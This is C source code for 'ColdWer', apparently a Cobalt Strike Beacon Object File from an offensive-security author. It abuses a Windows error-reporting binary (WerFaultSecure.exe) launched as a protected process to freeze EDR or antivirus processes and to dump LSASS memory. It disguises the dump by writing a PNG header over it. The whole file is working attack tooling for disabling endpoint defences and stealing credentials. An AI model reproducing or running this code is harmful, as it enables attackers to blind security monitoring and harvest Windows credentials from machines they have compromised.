/*
 * ColdWer - A cold war on your endpoint.
 * Freeze your EDR/AV. Extract what you need. Stay cold.
 *
 * Author: Sh3llf1r3
 * GitHub: https://github.com/0xsh3llf1r3
 *
 * Commands:
 *   cw-freeze <PID> [Path]   - Freeze target process
 *   cw-dump <PID> <Path>     - Dump LSASS (requires Win8.1 WerFaultSecure.exe)
 *   cw-unfreeze              - Unfreeze target process
 */

#include <windows.h>
#include <winternl.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, WINBOOL, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$TerminateProcess(HANDLE, UINT);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, WINBOOL, WINBOOL, LPCWSTR);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, WINBOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetProcessId(HANDLE);

DECLSPEC_IMPORT WINBOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT WINBOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, WINBOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

DECLSPEC_IMPORT int __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$memset(void*, int, size_t);

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef SE_DEBUG_NAME_W
#define SE_DEBUG_NAME_W L"SeDebugPrivilege"
#endif

#ifndef PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL
#define PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL 0x0002000B
#endif

#ifndef STILL_ACTIVE
#define STILL_ACTIVE 259
#endif

#ifndef HEAP_ZERO_MEMORY
#define HEAP_ZERO_MEMORY 0x00000008
#endif

#define StateWait 5
#define Suspended 5

#define MODE_FREEZE   1
#define MODE_DUMP     2
#define MODE_UNFREEZE 3

#define KEY_HPROCESS   "cw_hProc"
#define KEY_HTHREAD    "cw_hThread"
#define KEY_HDUMP      "cw_hDump"
#define KEY_HENCDUMP   "cw_hEncDump"
#define KEY_HCANCEL    "cw_hCancel"
#define KEY_WERPID     "cw_werPid"
#define KEY_TARGETPID  "cw_targetPid"
#define KEY_ACTIVE     "cw_active"

// 25 MB in bytes
#define MIN_DUMP_SIZE  26214400
#define MIN_DUMP_SIZE_MB 25

typedef struct _MY_SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} MY_SYSTEM_THREAD_INFORMATION;

typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    MY_SYSTEM_THREAD_INFORMATION Threads[1];
} MY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE ProcessHandle);
typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

void PrintWin32Error(DWORD errorCode)
{
    switch (errorCode) {
        case 2:
            BeaconPrintf(CALLBACK_ERROR, "File not found - check the path to WerFaultSecure.exe");
            break;
        case 3:
            BeaconPrintf(CALLBACK_ERROR, "Path not found - directory does not exist");
            break;
        case 5:
            BeaconPrintf(CALLBACK_ERROR, "Access denied - need Administrator or SYSTEM privileges");
            break;
        case 87:
            BeaconPrintf(CALLBACK_ERROR, "Invalid parameter - check command arguments");
            break;
        case 577:
            BeaconPrintf(CALLBACK_ERROR, "Invalid signature - WerFaultSecure.exe is not properly signed");
            break;
        case 740:
            BeaconPrintf(CALLBACK_ERROR, "Elevation required - run from elevated context");
            break;
        case 1314:
            BeaconPrintf(CALLBACK_ERROR, "Privilege not held - SeDebugPrivilege required");
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "Operation failed - Windows error %d", errorCode);
    }
}

BOOL EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = {0};
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, SE_DEBUG_NAME_W, &luid)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD lastError = KERNEL32$GetLastError();
    KERNEL32$CloseHandle(hToken);
    
    return (lastError == ERROR_SUCCESS);
}

DWORD GetMainThreadId(DWORD pid)
{
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;
    int attempts = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    PNtQuerySystemInformation NtQuerySystemInformation = 
        (PNtQuerySystemInformation)KERNEL32$GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) return 0;

    do {
        if (buffer) KERNEL32$HeapFree(hHeap, 0, buffer);
        buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer) return 0;

        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            bufferSize *= 2;
            if (++attempts > 10) {
                KERNEL32$HeapFree(hHeap, 0, buffer);
                return 0;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        KERNEL32$HeapFree(hHeap, 0, buffer);
        return 0;
    }

    DWORD mainThreadId = 0;
    MY_SYSTEM_PROCESS_INFORMATION* spi = (MY_SYSTEM_PROCESS_INFORMATION*)buffer;

    while (TRUE) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
            if (spi->NumberOfThreads > 0)
                mainThreadId = (DWORD)(ULONG_PTR)spi->Threads[0].ClientId.UniqueThread;
            break;
        }
        if (spi->NextEntryOffset == 0) break;
        spi = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }

    KERNEL32$HeapFree(hHeap, 0, buffer);
    return mainThreadId;
}

BOOL IsProcessSuspendedByPID(DWORD pid)
{
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;
    int attempts = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)KERNEL32$GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) return FALSE;

    do {
        if (buffer) KERNEL32$HeapFree(hHeap, 0, buffer);
        buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, bufferSize);
        if (!buffer) return FALSE;

        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            bufferSize *= 2;
            if (++attempts > 10) {
                KERNEL32$HeapFree(hHeap, 0, buffer);
                return FALSE;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        KERNEL32$HeapFree(hHeap, 0, buffer);
        return FALSE;
    }

    BOOL result = FALSE;
    MY_SYSTEM_PROCESS_INFORMATION* spi = (MY_SYSTEM_PROCESS_INFORMATION*)buffer;

    while (TRUE) {
        if ((DWORD)(ULONG_PTR)spi->UniqueProcessId == pid) {
            if (spi->NumberOfThreads == 0) break;
            result = TRUE;
            for (ULONG i = 0; i < spi->NumberOfThreads; ++i) {
                if (spi->Threads[i].ThreadState != StateWait || 
                    spi->Threads[i].WaitReason != Suspended) {
                    result = FALSE;
                    break;
                }
            }
            break;
        }
        if (spi->NextEntryOffset == 0) break;
        spi = (MY_SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }

    KERNEL32$HeapFree(hHeap, 0, buffer);
    return result;
}

BOOL SuspendProcessByPID(DWORD pid) 
{
    if (pid == 0) return FALSE;
    
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)KERNEL32$GetProcAddress(hNtdll, "NtSuspendProcess");
    if (!NtSuspendProcess) return FALSE;

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProcess) return FALSE;

    NTSTATUS status = NtSuspendProcess(hProcess);
    KERNEL32$CloseHandle(hProcess);
    
    return (status == 0);
}

BOOL ResumeProcessByPID(DWORD pid)
{
    if (pid == 0) return FALSE;
    
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtResumeProcess NtResumeProcess = (pNtResumeProcess)KERNEL32$GetProcAddress(hNtdll, "NtResumeProcess");
    if (!NtResumeProcess) return FALSE;

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
    if (!hProcess) return FALSE;

    NTSTATUS status = NtResumeProcess(hProcess);
    KERNEL32$CloseHandle(hProcess);
    
    return (status == 0);
}

BOOL CreatePPLProcess(wchar_t* commandLine, HANDLE* phProcess, HANDLE* phThread)
{
    SIZE_T size = 0;
    STARTUPINFOEXW siex = {0};
    siex.StartupInfo.cb = sizeof(siex);
    PROCESS_INFORMATION pi = {0};
    LPPROC_THREAD_ATTRIBUTE_LIST ptal = NULL;
    DWORD protectionLevel = 0;
    HANDLE hHeap = KERNEL32$GetProcessHeap();

    if (!KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &size) && 
        KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return FALSE;
    }

    ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
    if (!ptal) return FALSE;

    if (!KERNEL32$InitializeProcThreadAttributeList(ptal, 1, 0, &size)) {
        KERNEL32$HeapFree(hHeap, 0, ptal);
        return FALSE;
    }

    if (!KERNEL32$UpdateProcThreadAttribute(ptal, 0, 
        PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, 
        &protectionLevel, sizeof(protectionLevel), NULL, NULL)) {
        KERNEL32$DeleteProcThreadAttributeList(ptal);
        KERNEL32$HeapFree(hHeap, 0, ptal);
        return FALSE;
    }
    
    siex.lpAttributeList = ptal;

    if (!KERNEL32$CreateProcessW(NULL, commandLine, NULL, NULL, TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS,
        NULL, NULL, &siex.StartupInfo, &pi)) {
        DWORD err = KERNEL32$GetLastError();
        PrintWin32Error(err);
        KERNEL32$DeleteProcThreadAttributeList(ptal);
        KERNEL32$HeapFree(hHeap, 0, ptal);
        return FALSE;
    }

    KERNEL32$DeleteProcThreadAttributeList(ptal);
    KERNEL32$HeapFree(hHeap, 0, ptal);

    *phProcess = pi.hProcess;
    *phThread = pi.hThread;
    return TRUE;
}

// ============================================================================
// FREEZE MODE
// ============================================================================
BOOL FreezeRun(wchar_t* werPath, DWORD targetPID, DWORD targetTID)
{
    if (BeaconGetValue(KEY_ACTIVE) != NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Already frozen! Use cw-unfreeze first.");
        return FALSE;
    }
    
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    wchar_t dumpFileName[MAX_PATH];
    wchar_t encDumpFileName[MAX_PATH];
    MSVCRT$_snwprintf(dumpFileName, MAX_PATH, L"C:\\Windows\\Temp\\cw_%d.tmp", targetPID);
    MSVCRT$_snwprintf(encDumpFileName, MAX_PATH, L"C:\\Windows\\Temp\\cw_%d.enc", targetPID);
    
    HANDLE hDump = KERNEL32$CreateFileW(dumpFileName, GENERIC_WRITE | GENERIC_READ, 0, &sa, 
        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hDump == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        PrintWin32Error(err);
        return FALSE;
    }
    
    HANDLE hEncDump = KERNEL32$CreateFileW(encDumpFileName, GENERIC_WRITE, 0, &sa, 
        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hEncDump == INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(hDump);
        KERNEL32$DeleteFileW(dumpFileName);
        return FALSE;
    }

    HANDLE hCancel = KERNEL32$CreateEventW(&sa, TRUE, FALSE, NULL);
    if (!hCancel) {
        KERNEL32$CloseHandle(hDump);
        KERNEL32$CloseHandle(hEncDump);
        KERNEL32$DeleteFileW(dumpFileName);
        KERNEL32$DeleteFileW(encDumpFileName);
        return FALSE;
    }

    wchar_t commandLine[1024];
    MSVCRT$_snwprintf(commandLine, 1024, 
        L"%s /h /pid %d /tid %d /file %llu /encfile %llu /cancel %llu /type 268310",
        werPath, targetPID, targetTID, 
        (UINT_PTR)hDump, (UINT_PTR)hEncDump, (UINT_PTR)hCancel);

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    
    if (!CreatePPLProcess(commandLine, &hProcess, &hThread)) {
        KERNEL32$CloseHandle(hDump);
        KERNEL32$CloseHandle(hEncDump);
        KERNEL32$CloseHandle(hCancel);
        KERNEL32$DeleteFileW(dumpFileName);
        KERNEL32$DeleteFileW(encDumpFileName);
        return FALSE;
    }

    DWORD werPID = KERNEL32$GetProcessId(hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] WerFaultSecure PID: %d", werPID);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for suspension...");
    
    int waited = 0;
    BOOL suspended = FALSE;
    while (!suspended && waited < 10000) {
        KERNEL32$Sleep(100);
        waited += 100;
        suspended = IsProcessSuspendedByPID(targetPID);
        
        DWORD exitCode = 0;
        if (KERNEL32$GetExitCodeProcess(hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            BeaconPrintf(CALLBACK_ERROR, "Target process may be protected or have kernel-level self-defense");
            break;
        }
    }
    
    if (suspended) {
        if (SuspendProcessByPID(werPID)) {
            BeaconAddValue(KEY_HPROCESS, (void*)(ULONG_PTR)hProcess);
            BeaconAddValue(KEY_HTHREAD, (void*)(ULONG_PTR)hThread);
            BeaconAddValue(KEY_HDUMP, (void*)(ULONG_PTR)hDump);
            BeaconAddValue(KEY_HENCDUMP, (void*)(ULONG_PTR)hEncDump);
            BeaconAddValue(KEY_HCANCEL, (void*)(ULONG_PTR)hCancel);
            BeaconAddValue(KEY_WERPID, (void*)(ULONG_PTR)werPID);
            BeaconAddValue(KEY_TARGETPID, (void*)(ULONG_PTR)targetPID);
            BeaconAddValue(KEY_ACTIVE, (void*)1);
            
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Target PID %d SUSPENDED", targetPID);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] WerFault PID %d SUSPENDED", werPID);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Execute commands, then run cw-unfreeze");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] === FROZEN ===");
            return TRUE;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to suspend WerFaultSecure process");
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Target process may be protected or have kernel-level self-defense");
    }
    
    KERNEL32$TerminateProcess(hProcess, 1);
    KERNEL32$CloseHandle(hProcess);
    KERNEL32$CloseHandle(hThread);
    KERNEL32$CloseHandle(hDump);
    KERNEL32$CloseHandle(hEncDump);
    KERNEL32$CloseHandle(hCancel);
    KERNEL32$DeleteFileW(dumpFileName);
    KERNEL32$DeleteFileW(encDumpFileName);
    
    return FALSE;
}

// ============================================================================
// UNFREEZE MODE
// ============================================================================
BOOL UnfreezeRun()
{
    if (BeaconGetValue(KEY_ACTIVE) == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "No frozen state found. Did you run cw-freeze first?");
        return FALSE;
    }
    
    HANDLE hProcess = (HANDLE)(ULONG_PTR)BeaconGetValue(KEY_HPROCESS);
    HANDLE hThread = (HANDLE)(ULONG_PTR)BeaconGetValue(KEY_HTHREAD);
    HANDLE hDump = (HANDLE)(ULONG_PTR)BeaconGetValue(KEY_HDUMP);
    HANDLE hEncDump = (HANDLE)(ULONG_PTR)BeaconGetValue(KEY_HENCDUMP);
    HANDLE hCancel = (HANDLE)(ULONG_PTR)BeaconGetValue(KEY_HCANCEL);
    DWORD werPID = (DWORD)(ULONG_PTR)BeaconGetValue(KEY_WERPID);
    DWORD targetPID = (DWORD)(ULONG_PTR)BeaconGetValue(KEY_TARGETPID);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %d", targetPID);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Terminating WerFault PID: %d", werPID);
    
    if (hProcess && KERNEL32$TerminateProcess(hProcess, 1)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] WerFaultSecure terminated");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to terminate WerFaultSecure - may need manual cleanup");
    }
    
    if (hProcess) KERNEL32$CloseHandle(hProcess);
    if (hThread) KERNEL32$CloseHandle(hThread);
    if (hDump) KERNEL32$CloseHandle(hDump);
    if (hEncDump) KERNEL32$CloseHandle(hEncDump);
    if (hCancel) KERNEL32$CloseHandle(hCancel);
    
    wchar_t dumpFileName[MAX_PATH];
    wchar_t encDumpFileName[MAX_PATH];
    MSVCRT$_snwprintf(dumpFileName, MAX_PATH, L"C:\\Windows\\Temp\\cw_%d.tmp", targetPID);
    MSVCRT$_snwprintf(encDumpFileName, MAX_PATH, L"C:\\Windows\\Temp\\cw_%d.enc", targetPID);
    KERNEL32$DeleteFileW(dumpFileName);
    KERNEL32$DeleteFileW(encDumpFileName);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Temp files cleaned");
    
    BeaconRemoveValue(KEY_HPROCESS);
    BeaconRemoveValue(KEY_HTHREAD);
    BeaconRemoveValue(KEY_HDUMP);
    BeaconRemoveValue(KEY_HENCDUMP);
    BeaconRemoveValue(KEY_HCANCEL);
    BeaconRemoveValue(KEY_WERPID);
    BeaconRemoveValue(KEY_TARGETPID);
    BeaconRemoveValue(KEY_ACTIVE);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target process resumed");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] === UNFROZEN ===");
    return TRUE;
}

// ============================================================================
// DUMP MODE
// ============================================================================
BOOL DumpRun(wchar_t* werPath, DWORD targetPID, DWORD targetTID)
{
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    wchar_t dumpFile[MAX_PATH];
    wchar_t encDumpFile[MAX_PATH];
    
    MSVCRT$_snwprintf(dumpFile, MAX_PATH, L"C:\\Windows\\Temp\\lsass.dmp");
    MSVCRT$_snwprintf(encDumpFile, MAX_PATH, L"C:\\Windows\\Temp\\lsass.dmp.enc");

    HANDLE hDump = KERNEL32$CreateFileW(dumpFile, GENERIC_WRITE | GENERIC_READ, 0, &sa, 
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hEncDump = KERNEL32$CreateFileW(encDumpFile, GENERIC_WRITE, 0, &sa, 
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hDump == INVALID_HANDLE_VALUE || hEncDump == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        PrintWin32Error(err);
        if (hDump != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hDump);
        if (hEncDump != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hEncDump);
        return FALSE;
    }

    HANDLE hCancel = KERNEL32$CreateEventW(&sa, TRUE, FALSE, NULL);
    if (!hCancel) {
        KERNEL32$CloseHandle(hDump);
        KERNEL32$CloseHandle(hEncDump);
        return FALSE;
    }

    wchar_t commandLine[1024];
    MSVCRT$_snwprintf(commandLine, 1024,
        L"%s /h /pid %d /tid %d /file %llu /encfile %llu /cancel %llu /type 268310",
        werPath, targetPID, targetTID, 
        (UINT_PTR)hDump, (UINT_PTR)hEncDump, (UINT_PTR)hCancel);

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    
    if (!CreatePPLProcess(commandLine, &hProcess, &hThread)) {
        KERNEL32$CloseHandle(hDump);
        KERNEL32$CloseHandle(hEncDump);
        KERNEL32$CloseHandle(hCancel);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] WerFaultSecure PID: %d", KERNEL32$GetProcessId(hProcess));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Dumping (may take 1-2 minutes)...");
    
    for (int i = 0; i < 120; ++i) {
        KERNEL32$Sleep(1000);
        
        DWORD exitCode = 0;
        if (KERNEL32$GetExitCodeProcess(hProcess, &exitCode) && exitCode != STILL_ACTIVE) {
            break;
        }
        
        ResumeProcessByPID(targetPID);
        
        if (i > 0 && i % 15 == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Still dumping... %d seconds", i);
        }
    }

    KERNEL32$CloseHandle(hProcess);
    KERNEL32$CloseHandle(hThread);

    DWORD fileSize = KERNEL32$GetFileSize(hDump, NULL);
    DWORD fileSizeMB = fileSize / 1048576;

    if (fileSize >= MIN_DUMP_SIZE) {
        BYTE pngMagic[4] = { 0x89, 0x50, 0x4E, 0x47 };
        DWORD bytesWritten;
        KERNEL32$SetFilePointer(hDump, 0, NULL, FILE_BEGIN);
        KERNEL32$WriteFile(hDump, pngMagic, sizeof(pngMagic), &bytesWritten, NULL);
    }

    KERNEL32$CloseHandle(hDump);
    KERNEL32$CloseHandle(hEncDump);
    KERNEL32$CloseHandle(hCancel);
    KERNEL32$DeleteFileW(encDumpFile);

    if (fileSize >= MIN_DUMP_SIZE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Saved: C:\\Windows\\Temp\\lsass.dmp");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Size: %d MB", fileSizeMB);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Fix header: 89504E47 -> 4D444D50");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] === DUMP SUCCESS ===");
        return TRUE;
    }
    
    BeaconPrintf(CALLBACK_ERROR, "Dump failed - file too small (%d MB, need >= %d MB)", fileSizeMB, MIN_DUMP_SIZE_MB);
    BeaconPrintf(CALLBACK_ERROR, "Possible causes:");
    BeaconPrintf(CALLBACK_ERROR, "  - Wrong WerFaultSecure.exe version (need Win8.1)");
    BeaconPrintf(CALLBACK_ERROR, "  - Target process is protected");
    BeaconPrintf(CALLBACK_ERROR, "  - Insufficient privileges");
    
    KERNEL32$DeleteFileW(dumpFile);
    
    return FALSE;
}

// ============================================================================
// ENTRY POINT
// ============================================================================
void go(char* args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    int mode = BeaconDataInt(&parser);
    DWORD pid = BeaconDataInt(&parser);
    
    int pathLen = 0;
    wchar_t* customPath = (wchar_t*)BeaconDataExtract(&parser, &pathLen);
    
    wchar_t werPath[MAX_PATH];
    if (pathLen > 2 && customPath && customPath[0]) {
        MSVCRT$_snwprintf(werPath, MAX_PATH, L"%s", customPath);
    } else {
        MSVCRT$_snwprintf(werPath, MAX_PATH, L"C:\\Windows\\System32\\WerFaultSecure.exe");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[ColdWer] Stay Cold.");

    if (mode == MODE_UNFREEZE) {
        UnfreezeRun();
        return;
    }

    if (!EnableDebugPrivilege()) {
        BeaconPrintf(CALLBACK_ERROR, "Need Administrator or SYSTEM privileges");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s", mode == MODE_DUMP ? "DUMP" : "FREEZE");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %d", pid);

    DWORD tid = GetMainThreadId(pid);
    if (tid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Process with PID %d does not exist or is inaccessible", pid);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target TID: %d", tid);

    if (mode == MODE_DUMP) {
        DumpRun(werPath, pid, tid);
    } else if (mode == MODE_FREEZE) {
        FreezeRun(werPath, pid, tid);
    }
}
